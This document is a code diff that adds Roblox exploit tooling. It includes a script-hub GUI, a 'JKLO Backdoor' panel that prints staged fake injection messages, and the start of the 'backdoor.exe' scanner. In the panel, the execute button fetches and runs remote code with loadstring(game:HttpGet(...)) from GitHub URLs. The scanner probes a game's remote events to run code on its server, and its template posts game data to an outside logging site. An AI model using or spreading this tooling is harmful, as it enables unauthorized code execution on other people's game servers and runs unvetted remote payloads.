+            update(input)
+        end
+    end)
+end
+coroutine.wrap(VEUJFP_fake_script)()
+local function AKJCSK_fake_script() -- optionspage.Dragging 
+    local script = Instance.new('LocalScript', optionspage)
+
+    local UserInputService = game:GetService("UserInputService")
+
+    local gui = script.Parent
+
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+end
+coroutine.wrap(AKJCSK_fake_script)()
+local function VJHASD_fake_script() -- synminbutt.Dragging 
+    local script = Instance.new('LocalScript', synminbutt)
+
+    local UserInputService = game:GetService("UserInputService")
+
+    local gui = script.Parent
+
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+end
+coroutine.wrap(VJHASD_fake_script)()
+local function QQFYV_fake_script() -- tabs.Tabs 
+    local script = Instance.new("LocalScript", Tabs)
+
+    local currentTab
+
+    local function getTabs()
+		local tabs = {}
+		for _, v in pairs(script.Parent:GetChildren()) do
+			if v.Name:match("Tab_%d+") then
+				tabs[#tabs + 1] = v
+			end
+		end
+		return tabs
+	end
+
+    local function showTab(tab)
+        currentTab = tab
+        if not tab then
+            script.Parent.Parent.EditorFrame.Source.Text = ""
+            return
+        end
+        tab.ScriptTitle.Size = UDim2.new(0,55,0,19)
+        tab.ScriptTitle.Position = UDim2.new(tab.ScriptTitle.Position.X.Scale, 0, -0.074, 0)
+		tab.RemoveTab.Size = UDim2.new(0, 19, 0, 19)
+		tab.RemoveTab.Position = UDim2.new(tab.RemoveTab.Position.X.Scale, 0, -0.074, 0)
+    
+        script.Parent.Parent.EditorFrame.Source.Text = tostring(tab.Script.Value)
+        for i, v in pairs(getTabs()) do
+            if v ~= currentTab then
+                v.ScriptTitle.Size = UDim2.new(0, 45, 0, 17)
+                v.ScriptTitle.Position = UDim2.new(v.ScriptTitle.Position.X.Scale, 0, -0.066, 0)
+				v.RemoveTab.Size = UDim2.new(0, 24, 0, 17)
+				v.RemoveTab.Position = UDim2.new(v.RemoveTab.Position.X.Scale, 0, -0.066, 0)
+            end
+        end
+    end
+    local function removeTab(tab)
+        local tabs = getTabs()
+		local idx = 0
+		for i = 1, #tabs do
+			if tabs[i] == tab then
+				idx = i
+				tabs[i]:Destroy()
+				table.remove(tabs, i)
+			end
+		end
+	
+		local lastTab do
+			if #tabs > 0 then
+				lastTab = tabs[#tabs]
+			end
+		end
+	
+		for i, v in pairs(tabs) do
+			v.ScriptTitle.Position = tabs[i - 1] and UDim2.new(tabs[i - 1].ScriptTitle.Position.X.Scale + 0.103, 0, -0.074, 0) or UDim2.new(0, 0, -0.074, 0)
+			v.RemoveTab.Position = UDim2.new(v.ScriptTitle.Position.X.Scale + 0.067, 0, -0.074, 0)
+		end
+	
+		script.Parent.NewTab.Position = lastTab and lastTab.RemoveTab.Position + UDim2.new(0.046, 0, 0.008, 0) or UDim2.new(0, 0, -0.066, 0)
+		showTab(currentTab ~= tab and currentTab or tabs[idx] or tabs[idx - 1])
+    end
+
+    local function newTab()
+		local tabs = getTabs()
+		local tab = Instance.new("Folder", script.Parent)
+		local titlescript = Instance.new("TextButton", tab)
+		local remove = Instance.new("TextButton", tab)
+		local tabScript = Instance.new("StringValue", tab)
+		local lastTab do
+			if #tabs > 0 then
+				lastTab = tabs[#tabs]
+			end
+		end
+	
+		tab.Name = ("Tab_%d"):format(#tabs + 1)
+	
+		titlescript.Name = "ScriptTitle"
+		titlescript.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
+		titlescript.BorderSizePixel = 0
+		titlescript.Position = lastTab and UDim2.new(lastTab.ScriptTitle.Position.X.Scale + 0.103, 0, -0.074, 0) or UDim2.new(0, 0, -0.074, 0)
+		titlescript.Size = UDim2.new(0, 44,0, 19)
+		titlescript.Font = Enum.Font.SourceSans
+		titlescript.TextColor3 = Color3.fromRGB(255, 255, 255)
+		titlescript.TextSize = 15
+		titlescript.Text = ("Tab %d"):format(#tabs + 1)
+	
+		remove.Name = "RemoveTab"
+		remove.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
+		remove.BorderSizePixel = 0
+		remove.Position = UDim2.new(titlescript.Position.X.Scale + 0.067, 0, -0.074, 0)
+		remove.Size = UDim2.new(0, 24, 0, 19)
+		remove.Font = Enum.Font.SourceSans
+		remove.TextColor3 = Color3.fromRGB(255, 255, 255)
+		remove.TextSize = 14
+		remove.Text = "x"
+	
+		tabScript.Name = "Script"
+	
+		script.Parent.NewTab.Position = remove.Position + UDim2.new(0.046, 0, 0.008, 0)
+		
+		showTab(tab)
+	
+		titlescript.MouseButton1Click:Connect(function()
+			showTab(tab)
+		end)
+		remove.MouseButton1Click:Connect(function()
+			removeTab(tab)
+		end)
+		
+		return tab
+	end
+
+    currenTab = newTab()
+
+    showTab(currentTab)
+
+    script.Parent.NewTab.MouseButton1Click:Connect(function()
+		newTab()
+	end)
+	
+	script.Parent.Parent.EditorFrame.Source:GetPropertyChangedSignal("Text"):Connect(function()
+		currentTab.Script.Value = script.Parent.Parent.EditorFrame.Source.Text
+	end)
+end
+coroutine.wrap(QQFYV_fake_script)()
+while true do
+    wait(0.01)
+    if scripthub_2.Visible == true then
+        if scriptselected == "none" then
+            descri.Text = ""
+        end
+        if scriptselected == "dex" then
+            descri.Text = "A version of the popular Dex explorer with patches specifically for Synapse X."
+        end
+        if scriptselected == "spy" then
+            descri.Text = "Allows you to view RemoteEvents and RemoteFunctions called."
+        end
+    end
+end
+end)
+VsecondSection:NewButton("Backdoor.exe", "ButtonInfo", function()
+    game.StarterGui:SetCore("DevConsoleVisible", true)
+wait(1)
+print("Found ROBLOX Process...")
+game.StarterGui:SetCore("DevConsoleVisible", true)
+wait(2)
+print("Injecting 'JKLO' into CoreGui...")
+game.StarterGui:SetCore("DevConsoleVisible", true)
+wait(4)
+print("Injection Complete!")
+wait(1)
+game.StarterGui:SetCore("DevConsoleVisible", false)
+
+
+local STIGMA = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local main = Instance.new("Frame")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local input = Instance.new("TextBox")
+local execute = Instance.new("TextButton")
+local clear = Instance.new("TextButton")
+local file = Instance.new("TextButton")
+local extras = Instance.new("TextButton")
+local lua = Instance.new("TextButton")
+local help = Instance.new("TextButton")
+local fileframe = Instance.new("Frame")
+local minimize = Instance.new("TextButton")
+local exit = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local minimized = Instance.new("TextButton")
+local windowframe = Instance.new("Frame")
+local windowmain = Instance.new("Frame")
+local createdby = Instance.new("TextLabel")
+local buttonframe = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local abouttext = Instance.new("TextLabel")
+local helpframe = Instance.new("Frame")
+local about = Instance.new("TextButton")
+local ImageLabel = Instance.new("ImageLabel")
+
+
+
+STIGMA.Name = "STIGMA"
+STIGMA.Parent = game.CoreGui
+STIGMA.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+STIGMA.Parent = game.CoreGui
+
+Frame.Parent = STIGMA
+Frame.BackgroundColor3 = Color3.fromRGB(253, 253, 253)
+Frame.BorderColor3 = Color3.fromRGB(143, 210, 255)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.132295713, 0, 0.169778302, 0)
+Frame.Size = UDim2.new(0, 332, 0, 252)
+Frame.Active = true
+Frame.Draggable = true
+
+main.Name = "main"
+main.Parent = Frame
+main.BackgroundColor3 = Color3.fromRGB(243, 243, 243)
+main.BorderColor3 = Color3.fromRGB(152, 152, 152)
+main.Position = UDim2.new(0.00608264981, 0, 0.10370709, 0)
+main.Size = UDim2.new(0, 327, 0, 225)
+
+ScrollingFrame.Parent = main
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+ScrollingFrame.BorderColor3 = Color3.fromRGB(152, 152, 152)
+ScrollingFrame.Position = UDim2.new(-4.6662965e-08, 0, 0.088888891, 0)
+ScrollingFrame.Selectable = false
+ScrollingFrame.Size = UDim2.new(0, 286, 0, 205)
+
+input.Name = "input"
+input.Parent = ScrollingFrame
+input.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+input.BorderColor3 = Color3.fromRGB(0, 0, 0)
+input.BorderSizePixel = 0
+input.Position = UDim2.new(0, 0, 7.44331174e-08, 0)
+input.Size = UDim2.new(0, 272, 0, 449)
+input.Font = Enum.Font.Arcade
+input.Text = ""
+input.TextColor3 = Color3.fromRGB(0, 0, 0)
+input.TextSize = 14.000
+input.TextXAlignment = Enum.TextXAlignment.Left
+input.TextYAlignment = Enum.TextYAlignment.Top
+input.MultiLine = true
+
+execute.Name = "execute"
+execute.Parent = main
+execute.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+execute.BorderColor3 = Color3.fromRGB(199, 199, 199)
+execute.Position = UDim2.new(0.877675772, 0, 0.088888891, 0)
+execute.Size = UDim2.new(0, 40, 0, 102)
+execute.Font = Enum.Font.Arcade
+execute.Text = "EXE"
+execute.TextColor3 = Color3.fromRGB(0, 0, 0)
+execute.TextSize = 14.000
+execute.MouseButton1Click:Connect(function()
+if KeyBox.Text == "require(5253281926).bjgui('Tubers93HKRB')" then
+		Frame.Visible = false
+		wait(0.1)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/BOSSJKL2/UPDBOSJKLSO/main/UPDBOSJKLSORANKS"))()
+	end
+wait(1)
+if KeyBox.Text == "require(4815027269).k00pzkidd('Tubers93HKRB')" then
+		Frame.Visible = false
+		wait(0.1)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/BOSSJKL2/Skid/main/S"))()
+end
+end)
+clear.Name = "clear"
+clear.Parent = main
+clear.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+clear.BorderColor3 = Color3.fromRGB(199, 199, 199)
+clear.Position = UDim2.new(0.877675772, 0, 0.546666682, 0)
+clear.Size = UDim2.new(0, 40, 0, 102)
+clear.Font = Enum.Font.Arcade
+clear.Text = "CLEAR"
+clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+clear.TextSize = 14.000
+clear.MouseButton1Click:Connect(function()
+	input.Text = "CLEAR"
+wait(2)
+input.Text = ""
+end)
+
+file.Name = "file"
+file.Parent = main
+file.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+file.BackgroundTransparency = 1.000
+file.BorderColor3 = Color3.fromRGB(0, 0, 0)
+file.BorderSizePixel = 0
+file.Size = UDim2.new(0, 36, 0, 20)
+file.Font = Enum.Font.SourceSans
+file.Text = "File"
+file.TextColor3 = Color3.fromRGB(0, 0, 0)
+file.TextSize = 14.000
+file.MouseButton1Click:Connect(function()
+	fileframe.Visible = true
+	helpframe.Visible = false
+
+
+end)
+
+extras.Name = "extras"
+extras.Parent = main
+extras.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+extras.BackgroundTransparency = 1.000
+extras.BorderColor3 = Color3.fromRGB(0, 0, 0)
+extras.BorderSizePixel = 0
+extras.Position = UDim2.new(0.110091746, 0, 0, 0)
+extras.Size = UDim2.new(0, 36, 0, 20)
+extras.Font = Enum.Font.SourceSans
+extras.Text = "Extras"
+extras.TextColor3 = Color3.fromRGB(0, 0, 0)
+extras.TextSize = 14.000
+
+
+lua.Name = "lua"
+lua.Parent = main
+lua.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+lua.BackgroundTransparency = 1.000
+lua.BorderColor3 = Color3.fromRGB(0, 0, 0)
+lua.BorderSizePixel = 0
+lua.Position = UDim2.new(0.220183492, 0, 0, 0)
+lua.Size = UDim2.new(0, 36, 0, 20)
+lua.Font = Enum.Font.SourceSans
+lua.Text = "Lua"
+lua.TextColor3 = Color3.fromRGB(0, 0, 0)
+lua.TextSize = 14.000
+
+
+
+
+help.Name = "help"
+help.Parent = main
+help.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+help.BackgroundTransparency = 1.000
+help.BorderColor3 = Color3.fromRGB(0, 0, 0)
+help.BorderSizePixel = 0
+help.Position = UDim2.new(0.330275238, 0, 0, 0)
+help.Size = UDim2.new(0, 36, 0, 20)
+help.Font = Enum.Font.SourceSans
+help.Text = "Help"
+help.TextColor3 = Color3.fromRGB(0, 0, 0)
+help.TextSize = 14.000
+help.MouseButton1Down:connect(function()
+	helpframe.Visible = true
+	fileframe.Visible = false
+	
+
+end)
+
+fileframe.Name = "fileframe"
+fileframe.Parent = main
+fileframe.BackgroundColor3 = Color3.fromRGB(249, 249, 249)
+fileframe.BorderColor3 = Color3.fromRGB(179, 179, 179)
+fileframe.Position = UDim2.new(0, 0, 0.0933333337, 0)
+fileframe.Size = UDim2.new(0, 132, 0, 37)
+fileframe.Visible = false
+
+minimize.Name = "minimize"
+minimize.Parent = fileframe
+minimize.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+minimize.BackgroundTransparency = 1.000
+minimize.BorderColor3 = Color3.fromRGB(0, 0, 0)
+minimize.BorderSizePixel = 0
+minimize.Position = UDim2.new(0.174242422, 0, 0, 0)
+minimize.Size = UDim2.new(0, 109, 0, 18)
+minimize.Font = Enum.Font.SourceSans
+minimize.Text = "Minimize"
+minimize.TextColor3 = Color3.fromRGB(0, 0, 0)
+minimize.TextSize = 14.000
+minimize.TextXAlignment = Enum.TextXAlignment.Left
+minimize.MouseButton1Click:Connect(function()
+	Frame.Visible = false
+	minimized.Visible = true
+end)
+
+exit.Name = "exit"
+exit.Parent = fileframe
+exit.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+exit.BackgroundTransparency = 1.000
+exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
+exit.BorderSizePixel = 0
+exit.Position = UDim2.new(0.174242422, 0, 0.486486495, 0)
+exit.Size = UDim2.new(0, 109, 0, 18)
+exit.Font = Enum.Font.SourceSans
+exit.Text = "Exit"
+exit.TextColor3 = Color3.fromRGB(0, 0, 0)
+exit.TextSize = 14.000
+exit.TextXAlignment = Enum.TextXAlignment.Left
+exit.MouseButton1Click:Connect(function()
+	Frame.Visible = false
+end)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.0843373463, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 26)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "JKLO Backdoor Improved"
+TextLabel.TextColor3 = Color3.fromRGB(74, 74, 74)
+TextLabel.TextSize = 16.000
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.00602409616, 0, 0.0119047621, 0)
+ImageLabel.Size = UDim2.new(0, 19, 0, 20)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=15487393092"
+
+minimized.Name = "minimized"
+minimized.Parent = STIGMA
+minimized.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+minimized.BorderColor3 = Color3.fromRGB(0, 0, 0)
+minimized.BorderSizePixel = 0
+minimized.Position = UDim2.new(-0.000545215677, 0, 0.945157588, 0)
+minimized.Size = UDim2.new(0, 93, 0, 31)
+minimized.Visible = false
+minimized.Font = Enum.Font.SourceSans
+minimized.Text = "JKLO"
+minimized.TextColor3 = Color3.fromRGB(0, 0, 0)
+minimized.TextSize = 17.000
+minimized.MouseButton1Click:Connect(function()
+	Frame.Visible = true
+	fileframe.Visible = false
+	minimized.Visible = false
+end)
+
+helpframe.Name = "helpframe"
+helpframe.Parent = main
+helpframe.BackgroundColor3 = Color3.fromRGB(249, 249, 249)
+helpframe.BorderColor3 = Color3.fromRGB(179, 179, 179)
+helpframe.Position = UDim2.new(0.330275238, 0, 0.088888891, 0)
+helpframe.Size = UDim2.new(0, 109, 0, 18)
+helpframe.Visible = false
+
+windowframe.Name = "windowframe"
+windowframe.Parent = STIGMA
+windowframe.Active = true
+windowframe.BackgroundColor3 = Color3.fromRGB(253, 253, 253)
+windowframe.BorderColor3 = Color3.fromRGB(143, 210, 255)
+windowframe.BorderSizePixel = 0
+windowframe.Position = UDim2.new(0.597292781, 0, 0.360560119, 0)
+windowframe.Size = UDim2.new(0, 168, 0, 143)
+windowframe.Visible = false
+
+windowmain.Name = "windowmain"
+windowmain.Parent = windowframe
+windowmain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+windowmain.BorderColor3 = Color3.fromRGB(152, 152, 152)
+windowmain.Position = UDim2.new(0.0060828072, 0, 0.181817755, 0)
+windowmain.Size = UDim2.new(0, 165, 0, 115)
+
+createdby.Name = "createdby"
+createdby.Parent = windowmain
+createdby.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+createdby.BackgroundTransparency = 1.000
+createdby.BorderColor3 = Color3.fromRGB(0, 0, 0)
+createdby.BorderSizePixel = 0
+createdby.Position = UDim2.new(-0.212121218, 0, 0.0956521705, 0)
+createdby.Size = UDim2.new(0, 200, 0, 50)
+createdby.Font = Enum.Font.SourceSans
+createdby.Text = "Created by JO1TAR0, Improved by MLG2023DJ, Supr_14 "
+createdby.TextColor3 = Color3.fromRGB(0, 0, 0)
+createdby.TextSize = 14.000
+
+buttonframe.Name = "buttonframe"
+buttonframe.Parent = windowmain
+buttonframe.BackgroundColor3 = Color3.fromRGB(227, 227, 227)
+buttonframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+buttonframe.BorderSizePixel = 0
+buttonframe.Position = UDim2.new(0, 0, 0.530434787, 0)
+buttonframe.Size = UDim2.new(0, 165, 0, 54)
+
+TextButton.Parent = buttonframe
+TextButton.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.Position = UDim2.new(0.393939406, 0, 0.240740746, 0)
+TextButton.Size = UDim2.new(0, 84, 0, 27)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "OK"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.MouseButton1Down:connect(function()
+	windowframe.Visible = false
+end)
+
+abouttext.Name = "abouttext"
+abouttext.Parent = windowframe
+abouttext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+abouttext.BackgroundTransparency = 1.000
+abouttext.BorderColor3 = Color3.fromRGB(0, 0, 0)
+abouttext.BorderSizePixel = 0
+abouttext.Position = UDim2.new(0.0060828072, 0, 0, 0)
+abouttext.Size = UDim2.new(0, 84, 0, 26)
+abouttext.Font = Enum.Font.SourceSans
+abouttext.Text = "About"
+abouttext.TextColor3 = Color3.fromRGB(74, 74, 74)
+abouttext.TextSize = 16.000
+abouttext.TextXAlignment = Enum.TextXAlignment.Left
+
+about.Name = "about"
+about.Parent = helpframe
+about.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+about.BackgroundTransparency = 1.000
+about.BorderColor3 = Color3.fromRGB(0, 0, 0)
+about.BorderSizePixel = 0
+about.Position = UDim2.new(0.174242422, 0, 0, 0)
+about.Size = UDim2.new(0, 109, 0, 18)
+about.Font = Enum.Font.SourceSans
+about.Text = "About"
+about.TextColor3 = Color3.fromRGB(0, 0, 0)
+about.TextSize = 14.000
+about.TextXAlignment = Enum.TextXAlignment.Left
+about.MouseButton1Down:connect(function()
+	helpframe.Visible = false
+	windowframe.Visible = true
+end)
+
+
+
+
+local xbox = Instance.new("Sound")
+xbox.Parent = game:GetService("SoundService")
+xbox.SoundId = "rbxassetid://3023237993"
+xbox.Volume = 5
+xbox.Name = "Sound"
+xbox:Play()
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "JKLO Backdoor";
+	Text = "JKLO Backdoor has been Injected.";
+	Icon = "http://www.roblox.com/asset/?id=125990109718129";
+	Duration = 6; 
+	Button1 = "Ok";
+})
+
+
+local function XPCO_fake_script() -- Frame.Dragify 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UserInputService = game:GetService("UserInputService")
+
+	local gui = script.Parent
+
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+coroutine.wrap(XPCO_fake_script)()
+
+local function LZVR_fake_script() -- windowframe.windowdrag 
+	local script = Instance.new('LocalScript', windowframe)
+
+	local UserInputService = game:GetService("UserInputService")
+
+	local gui = script.Parent
+
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+coroutine.wrap(LZVR_fake_script)()
+--[========================================================================[
+    backdoor.exe, the best backdoor scanner in Roblox.
+    Copyright (C) 2021	iK4oS
+
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+--]========================================================================]
+
+
+--// TYPES \\--
+--[[ export type LikelyBackdoor = RemoteEvent|RemoteFunction;
+export type MakeDummy = (LikelyBackdoor, string) -> nil;
+export type ExecuteBackdoor = (BackdoorGateway, ...any) -> any;
+
+-- @BackdoorSolver
+-- Solvers allow us to provide a maintanable way of
+-- adding new backdoors detections and executions.
+export type BackdoorSolver = {
+    makeDummy: MakeDummy,
+    Execute: ExecuteBackdoor
+}
+
+-- @BackdoorGateway
+-- Once found a backdoor we instanciate a new gateway which is responsible of using the backdoor
+export type BackdoorGateway = {
+    b: LikelyBackdoor,                          -- backdoor
+    Execute: (BackdoorGateway, ...any) -> any
+};]]
+--// SERVICES \\--
+
+local httpService = game:GetService("HttpService");
+local serverScript = game:GetService("ServerScriptService");
+local players = game:GetService("Players");
+local localPlayer = players.LocalPlayer;
+
+--// GLOBALS \\--
+local MAXTIMEOUT = 20;
+local TITLE = "backdoor.exe - v8.0.0";
+local BACKDOOR_SOLVER = {};
+local BACKDOOR_FILTER = {};
+local URSTRING_TO_BACKDOOR = {};
+local ALPHABET = {
+    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
+    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+", "[", "]", "{", "}", "|", ";", ":", ",", ".", "?", "/", "`", "~"
+};
+
+-- // CONSTANTS \\--
+local EXEC_DEBUG = [[
+local BEXE_stdout = {};
+local print = function(...)
+    table.insert(BEXE_stdout, {
+        value = {...}
+    });
+end;
+local warn = function(...)
+    table.insert(BEXE_stdout, {
+        warn = true,
+        value = {...}
+    });
+end;
+local int, err = pcall(function() %s end);
+local BEXE = Instance.new("BoolValue");
+BEXE.Name = "%s";
+BEXE.Value = int;
+if not int then
+    bool:SetAttribute("err", err);
+end;
+if #BEXE_stdout > 0 then
+    BEXE:SetAttribute(
+        "stdout",
+        game:GetService("HttpService"):JSONEncode(BEXE_stdout)
+    );
+end;
+BEXE.Parent = workspace;
+game:GetService("Debris"):AddItem(BEXE, 3);
+]];
+-- this code execute on game server, doesn't have any role with user client
+local LOG_GAME = [[
+if BEXE_LOG == true then return; end;
+getfenv()["BEXE_LOG"] = true;
+
+    
+local httpService = game:GetService("HttpService");
+httpService:RequestAsync(
+    {
+        Url = "https://k4scripts.xyz/bexe/log",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = httpService:JSONEncode({Data = "%s"})
+    }
+);
+]];
+
+--// UTILS \\--
+
+local function stringSplit (inputstr, sep)
+    if sep == nil then
+        sep = "%s"
+    end
+    local t={}
+    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
+        table.insert(t, str)
+    end
+    return t
+end
+
+-- solve roblox path
+local roRoots = {
+    workspace = workspace,
+    game = game
+}
+
+local function solveRobloxPath(path)
+    local path = stringSplit(path, ".");
+    local inst = roRoots[path[1]] or game:GetService(path[1]);
+    if not inst then
+        return nil;
+    end;
+    for i = 2, #path do
+        inst = inst:FindFirstChild(path[i]);
+        if not inst then
+            return nil;
+        end;
+    end;
+    return inst;
+end;
+
+-- encode backdoors table
+local function encodeBackdoors(backdoors)
+    local encoded = {};
+    for i, v in ipairs(backdoors) do
+        table.insert(encoded, v.b:GetFullName());
+    end
+    return encoded;
+end;
+
+-- fire RemoteEvent/RemoteFunction with the given arguments in a new thread
+local function runRemote(r, ...)
+    if r:IsA("RemoteEvent") then
+        return task.spawn(r.FireServer, r, ...);
+    elseif r:IsA("RemoteFunction") then
+        return task.spawn(r.InvokeServer, r, ...);
+    end
+end;
+
+-- generate an unique random string name inside the passed parent
+local function urString(len, parent)
+    local name = "";
+    local r = Random.new();
+    while true do
+        for i = 1, len do
+            local idx = r:NextInteger(1, #ALPHABET);
+            local c = ALPHABET[idx];
+            name = name .. c;
+        end;
+        if parent == nil or parent:FindFirstChild(name) == nil then
+            break;
+        end;
+        -- rare but still possible :o
+        name = "";
+    end
+    return name;
+end;
+
+-- wrap to make a BackdoorGateway
+local function makeGateway(r, s)
+    return {
+        b = r,
+        Execute = s.Execute
+    };
+end;
+
+--// SOLVERS \\--
+
+-- [[COMMON BACKDOOR SOLVER]]
+-- @detection by performing a remote run and instanciating a dummy instance
+-- @execution_param code:string
+BACKDOOR_SOLVER[1] = {
+    makeDummy = function(r, dummyName)
+        --[[ check if loadstring is disabled | sobly not work
+        if gethiddenproperty(ServerScript, "LoadStringEnabled") == false then
+            URSTRING_TO_BACKDOOR[dummyName] = nil;
+            return;
+        end;]]
+        local src = ('local d = Instance.new("BoolValue", workspace);d.Name = "%s";game:GetService("Debris"):AddItem(d, 3);'):format(
+            dummyName
+        );
+        runRemote(r, src);
+    end,
+    Execute = function(g, code)
+        return runRemote(g.b, code);
+    end
+};
+
+--// FILTERS \\--
+-- I suggest registering filters in priority order, and they must be thread safe.
+
